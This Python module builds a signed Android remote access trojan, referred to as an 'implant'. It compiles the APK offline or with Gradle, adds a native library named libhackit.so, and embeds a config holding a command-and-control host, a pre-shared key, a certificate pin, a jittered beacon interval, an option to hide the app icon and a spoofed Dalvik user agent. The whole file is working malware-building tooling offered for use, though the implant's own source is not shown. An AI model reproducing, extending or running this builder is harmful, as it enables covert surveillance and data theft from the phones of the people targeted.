"""APK builder: bake a host/PSK config into the implant and produce a signed APK.

Two engines, picked automatically:

* ``gradle`` — full AGP build with R8 shrinking. Needs a JDK + Android SDK +
  a Gradle install. Produces a minified release APK.
* ``sdk``    — offline toolchain build (aapt2 → javac → d8 → zipalign →
  apksigner) against the platform ``android.jar``. No Gradle, no network,
  no AGP. This is the path when only build-tools are installed.

Both engines write into ``build/<stamp>/`` and leave the finished APK plus the
exact ``agent.json`` in place. Toolchain discovery is explicit — a missing
piece names itself and the env var that fixes it, never a silent fallback.
"""
from __future__ import annotations

import base64
import glob
import json
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass
from typing import Dict, List, Optional

TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "template")
MIN_SDK = 21
TARGET_SDK = 35
BUILD_TIMEOUT = 1800


class BuildError(Exception):
    """Toolchain missing, template corrupt, or a build step failed."""


ABIS = ("arm64-v8a", "armeabi-v7a", "x86_64")


@dataclass
class Toolchain:
    android_home: str
    java: str
    javac: str
    keytool: str
    build_tools: str
    platform_jar: str
    gradle: Optional[str]
    aapt2: str
    d8: str
    zipalign: str
    apksigner: str
    ndk: str
    cmake: str


def _which(name: str, extra: List[str]) -> Optional[str]:
    found = shutil.which(name)
    if found:
        return found
    for folder in extra:
        candidate = os.path.join(folder, name)
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return None


def _sdk_root() -> str:
    for key in ("ANDROID_HOME", "ANDROID_SDK_ROOT"):
        value = os.environ.get(key)
        if value and os.path.isdir(value):
            return value
    for guess in (
        os.path.join(os.path.expanduser("~"), "Android", "Sdk"),
        os.path.join(os.path.expanduser("~"), "android-sdk"),
        "/opt/android-sdk",
        "/usr/lib/android-sdk",
    ):
        if os.path.isdir(guess):
            return guess
    raise BuildError("Android SDK not found — set ANDROID_HOME to the sdk directory")


def _latest(folder: str) -> Optional[str]:
    """Highest numeric suffix in a sdk folder ("android-35", "35.0.0")."""
    if not os.path.isdir(folder):
        return None
    entries = []
    for name in os.listdir(folder):
        numbers = [int(p) for p in re.findall(r"\d+", name)]
        if numbers:
            entries.append((numbers, name))
    if not entries:
        return None
    entries.sort(key=lambda item: item[0])
    return os.path.join(folder, entries[-1][1])


def discover(engine: str = "auto") -> Toolchain:
    home = _sdk_root()
    java = _which("java", [os.path.join(home, "jbr", "bin")])
    javac = _which("javac", [os.path.join(home, "jbr", "bin")])
    if not java or not javac:
        raise BuildError("JDK not found — JDK 17 is required (brew/apt install openjdk@17)")
    keytool = os.path.join(os.path.dirname(javac), "keytool")
    if not os.path.isfile(keytool):
        raise BuildError(f"keytool missing next to javac ({keytool})")

    bt_root = os.path.join(home, "build-tools")
    build_tools = _latest(bt_root) or ""
    platform = _latest(os.path.join(home, "platforms"))
    if not platform or not os.path.isfile(os.path.join(platform, "android.jar")):
        raise BuildError(f"no platform android.jar under {os.path.join(home, 'platforms')}")
    if not build_tools and engine in ("sdk", "auto"):
        raise BuildError(f"no build-tools under {bt_root} — `sdkmanager 'build-tools;35.0.0'`")

    def tool(name: str) -> str:
        found = _which(name, [build_tools])
        if not found:
            raise BuildError(f"build-tools binary not found: {name}")
        return found

    ndk_root = os.path.join(home, "ndk")
    ndk = _latest(ndk_root) or ""
    cmake = _which("cmake", [os.path.join(home, "cmake", "3.22.1", "bin")])
    if engine == "sdk" and not ndk:
        raise BuildError("NDK missing — `sdkmanager 'ndk;27.2.12479018'`")
    if engine == "sdk" and not cmake:
        raise BuildError("cmake missing — needed to build libhackit.so")

    return Toolchain(
        android_home=home,
        java=java,
        javac=javac,
        keytool=keytool,
        build_tools=build_tools,
        platform_jar=os.path.join(platform, "android.jar"),
        gradle=_which("gradle", []),
        aapt2=tool("aapt2") if build_tools else "",
        d8=tool("d8") if build_tools else "",
        zipalign=tool("zipalign") if build_tools else "",
        apksigner=tool("apksigner") if build_tools else "",
        ndk=ndk,
        cmake=cmake or "",
    )


def _stage(config: Dict[str, object]) -> str:
    if not os.path.isdir(TEMPLATE_DIR):
        raise BuildError(f"template missing: {TEMPLATE_DIR}")
    stamp = time.strftime("%Y%m%d-%H%M%S")
    root = os.environ.get("HACKIT_RAT_HOME") or os.path.join(os.path.expanduser("~"), ".hackit", "rat")
    work = os.path.join(root, "build", stamp)
    shutil.copytree(TEMPLATE_DIR, work)
    assets = os.path.join(work, "src", "main", "assets")
    os.makedirs(assets, exist_ok=True)
    with open(os.path.join(assets, "agent.json"), "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    return work


def _run(cmd: List[str], cwd: str, label: str, env: Optional[Dict[str, str]] = None) -> str:
    merged = dict(os.environ)
    if env:
        merged.update(env)
    proc = subprocess.run(
        cmd, cwd=cwd, env=merged, capture_output=True, text=True, timeout=BUILD_TIMEOUT
    )
    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or "").strip().splitlines()[-40:]
        raise BuildError(f"{label} failed ({proc.returncode}):\n" + "\n".join(tail))
    return proc.stdout


def _keystore(work: str, tc_tool: str = "keytool") -> str:
    """A debug keystore is generated once per build tree and reused."""
    ks = os.path.join(work, "debug.keystore")
    if os.path.isfile(ks):
        return ks
    _run(
        [
            tc_tool,
            "-genkeypair", "-keystore", ks, "-storepass", "hackit", "-keypass", "hackit",
            "-alias", "hackit", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
            "-dname", "CN=Android Debug,O=Android,C=US",
        ],
        work,
        "keytool",
    )
    return ks


def _sources(work: str) -> List[str]:
    root = os.path.join(work, "src", "main", "java")
    out: List[str] = []
    for base, _dirs, names in os.walk(root):
        for name in names:
            if name.endswith(".java"):
                out.append(os.path.join(base, name))
    out.sort()
    if not out:
        raise BuildError("no java sources in template")
    return out


def _build_native(work: str, tc: Toolchain) -> int:
    """CMake + NDK for each ABI. Returns the number of .so files produced."""
    source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "native")
    if not os.path.isdir(source):
        return 0
    toolchain = os.path.join(tc.ndk, "build", "cmake", "android.toolchain.cmake")
    if not tc.ndk or not os.path.isfile(toolchain):
        return 0
    built = 0
    for abi in ABIS:
        build_dir = os.path.join(work, "native", abi)
        os.makedirs(build_dir, exist_ok=True)
        configure = [
            tc.cmake, "-S", source, "-B", build_dir, "-G", "Unix Makefiles",
            f"-DCMAKE_TOOLCHAIN_FILE={toolchain}",
            f"-DANDROID_ABI={abi}",
            "-DANDROID_PLATFORM=android-21",
            "-DCMAKE_BUILD_TYPE=Release",
        ]
        proc = subprocess.run(configure, capture_output=True, text=True, timeout=BUILD_TIMEOUT)
        if proc.returncode != 0:
            raise BuildError(f"cmake configure {abi} failed:\n" + (proc.stderr or proc.stdout)[-1500:])
        proc = subprocess.run([tc.cmake, "--build", build_dir, "-j", "4"],
                              capture_output=True, text=True, timeout=BUILD_TIMEOUT)
        if proc.returncode != 0:
            raise BuildError(f"cmake build {abi} failed:\n" + (proc.stderr or proc.stdout)[-1500:])
        library = os.path.join(build_dir, "libhackit.so")
        if not os.path.isfile(library):
            raise BuildError(f"libhackit.so not produced for {abi}")
        target = os.path.join(work, "jni", abi)
        os.makedirs(target, exist_ok=True)
        shutil.copy2(library, os.path.join(target, "libhackit.so"))
        built += 1
    return built


def _add_native_libs(work: str, apk: str) -> None:
    import zipfile

    jni = os.path.join(work, "jni")
    if not os.path.isdir(jni):
        return
    with zipfile.ZipFile(apk, "a", zipfile.ZIP_DEFLATED) as archive:
        for abi in os.listdir(jni):
            library = os.path.join(jni, abi, "libhackit.so")
            if os.path.isfile(library):
                archive.write(library, f"lib/{abi}/libhackit.so")


def build_with_sdk(work: str, tc: Toolchain) -> str:
    """Offline build straight off build-tools. Deterministic step order."""
    manifest = os.path.join(work, "src", "main", "AndroidManifest.xml")
    res = os.path.join(work, "src", "main", "res")
    assets = os.path.join(work, "src", "main", "assets")
    gen = os.path.join(work, "gen")
    classes = os.path.join(work, "classes")
    dex = os.path.join(work, "dex")
    os.makedirs(gen, exist_ok=True)
    os.makedirs(classes, exist_ok=True)
    os.makedirs(dex, exist_ok=True)

    compiled = os.path.join(work, "res.zip")
    _run([tc.aapt2, "compile", "--dir", res, "-o", compiled], work, "aapt2 compile")

    unsigned = os.path.join(work, "unsigned.apk")
    _run(
        [
            tc.aapt2, "link", "-o", unsigned, "-I", tc.platform_jar,
            "--manifest", manifest, "-A", assets, "--java", gen,
            "--min-sdk-version", str(MIN_SDK), "--target-sdk-version", str(TARGET_SDK),
            "--version-code", "20260001", "--version-name", "1.0.0", compiled,
        ],
        work,
        "aapt2 link",
    )

    sources = _sources(work)
    for rjava in glob.glob(os.path.join(gen, "**", "R.java"), recursive=True):
        sources.append(rjava)
    _run(
        [
            tc.javac, "-source", "8", "-target", "8", "-nowarn",
            "-Xlint:none", "-encoding", "UTF-8", "-classpath", tc.platform_jar,
            "-d", classes, *sources,
        ],
        work,
        "javac",
    )

    class_files: List[str] = []
    for base, _dirs, names in os.walk(classes):
        class_files.extend(os.path.join(base, n) for n in names if n.endswith(".class"))
    _run([tc.d8, "--release", "--min-api", str(MIN_SDK), "--lib", tc.platform_jar,
          "--output", dex, *sorted(class_files)], work, "d8")

    _run([tc.zipalign, "-f", "4", unsigned, os.path.join(work, "aligned.apk")], work, "zipalign")

    built = _build_native(work, tc)
    if built:
        print(f"  native      libhackit.so x{built} ABIs")

    # classes.dex has to enter the archive after aapt2 linked the resources.
    import zipfile

    aligned = os.path.join(work, "aligned.apk")
    with zipfile.ZipFile(aligned, "a", zipfile.ZIP_DEFLATED) as archive:
        archive.write(os.path.join(dex, "classes.dex"), "classes.dex")

    # A zip write invalidates alignment for the new entry only; re-align.
    final_align = os.path.join(work, "final.apk")
    _add_native_libs(work, aligned)
    _run([tc.zipalign, "-f", "4", aligned, final_align], work, "zipalign (dex)")

    ks = _keystore(work, tc.keytool)
    signed = os.path.join(work, "agent.apk")
    _run(
        [
            tc.apksigner, "sign", "--ks", ks, "--ks-pass", "pass:hackit",
            "--key-pass", "pass:hackit", "--ks-key-alias", "hackit",
            "--min-sdk-version", str(MIN_SDK), "--out", signed, final_align,
        ],
        work,
        "apksigner",
    )
    return signed


def build_with_gradle(work: str, tc: Toolchain, release: bool) -> str:
    _keystore(work, tc.keytool)
    gradle = tc.gradle or os.path.join(work, "gradlew")
    env = {"ANDROID_HOME": tc.android_home, "ANDROID_SDK_ROOT": tc.android_home}
    task = "assembleRelease" if release else "assembleDebug"
    args = [gradle, "--no-daemon", "--console=plain", task]
    if tc.gradle:
        args = [tc.gradle, "--no-daemon", "--console=plain", "-p", work, task]
        cwd = work
    else:
        cwd = work
    _run(args, cwd, f"gradle {task}", env)
    pattern = os.path.join(work, "build", "outputs", "apk", "**", "*.apk")
    found = sorted(glob.glob(pattern, recursive=True), key=os.path.getmtime)
    if not found:
        raise BuildError("gradle finished but produced no apk")
    return found[-1]


def make_config(
    host: str,
    psk_b64: str,
    label: str,
    interval_ms: int,
    hide_icon: bool,
    pin_sha256: Optional[str],
) -> Dict[str, object]:
    if not psk_b64:
        raise BuildError("empty psk")
    try:
        raw = base64.b64decode(psk_b64, validate=True)
    except ValueError as exc:
        raise BuildError(f"psk is not valid base64: {exc}") from exc
    if len(raw) != 32:
        raise BuildError(f"psk must decode to 32 bytes, got {len(raw)}")
    if not host.startswith(("http://", "https://")):
        raise BuildError("host must start with http:// or https://")
    from urllib.parse import urlparse

    parsed = urlparse(host)
    base_port = parsed.port or (443 if parsed.scheme == "https" else 80)
    interval = max(15_000, min(int(interval_ms), 6 * 60 * 60 * 1000))
    return {
        "host": host.rstrip("/"),
        "psk": psk_b64,
        "label": label[:64],
        "interval": interval,
        "jitter": 0.30,
        "hide_icon": bool(hide_icon),
        "pin": (pin_sha256 or "").replace(":", "").lower(),
        "min_sdk": MIN_SDK,
        "target_sdk": TARGET_SDK,
        "user_agent": "Dalvik/2.1.0 (Linux; U; Android)",
        "native_port": base_port + 100,
    }


def build(
    config: Dict[str, object],
    engine: str = "auto",
    release: bool = True,
    out: Optional[str] = None,
) -> str:
    """Run the build and return the APK path. Raises BuildError on any doubt."""
    if engine not in ("auto", "sdk", "gradle"):
        raise BuildError(f"unknown engine {engine!r}")
    if engine == "auto":
        engine = "gradle" if shutil.which("gradle") else "sdk"
    tc = discover(engine)
    work = _stage(config)
    if engine == "gradle":
        produced = build_with_gradle(work, tc, release)
    else:
        produced = build_with_sdk(work, tc)

    target = out or os.path.join(work, "agent-signed.apk")
    os.makedirs(os.path.dirname(os.path.abspath(target)) or ".", exist_ok=True)
    if os.path.abspath(produced) != os.path.abspath(target):
        shutil.copy2(produced, target)
    size = os.path.getsize(target)
    if size < 10_000:
        raise BuildError(f"apk suspiciously small ({size} bytes) — build likely incomplete")
    print(f"  engine      {engine}")
    print(f"  work        {work}")
    print(f"  apk         {target}  ({size:,} bytes)")
    print(f"  config      {os.path.join(work, 'src', 'main', 'assets', 'agent.json')}")
    return target


def doctor() -> int:
    """Report what the toolchain has and what is missing, without building."""
    problems = 0
    try:
        tc = discover("auto")
    except BuildError as exc:
        print(f"  [x] {exc}")
        return 1
    checks = {
        "ANDROID_HOME": tc.android_home,
        "java": tc.java,
        "javac": tc.javac,
        "android.jar": tc.platform_jar,
        "build-tools": tc.build_tools or "MISSING",
        "aapt2": tc.aapt2 or "MISSING",
        "d8": tc.d8 or "MISSING",
        "zipalign": tc.zipalign or "MISSING",
        "apksigner": tc.apksigner or "MISSING",
        "ndk": tc.ndk or "MISSING (native engine disabled)",
        "cmake": tc.cmake or "MISSING (native engine disabled)",
        "gradle (optional)": tc.gradle or "absent — sdk engine will be used",
    }
    for name, value in checks.items():
        state = "x" if value == "MISSING" else "ok"
        if state == "x":
            problems += 1
        print(f"  [{state}] {name}: {value}")
    try:
        version = subprocess.run([tc.java, "-version"], capture_output=True, text=True, timeout=20)
        print(f"  [ok] java version: {(version.stderr or version.stdout).splitlines()[0]}")
    except (subprocess.SubprocessError, OSError):
        print("  [x] java does not run")
        problems += 1
    return 0 if problems == 0 else 1


if __name__ == "__main__":
    sys.exit(doctor())
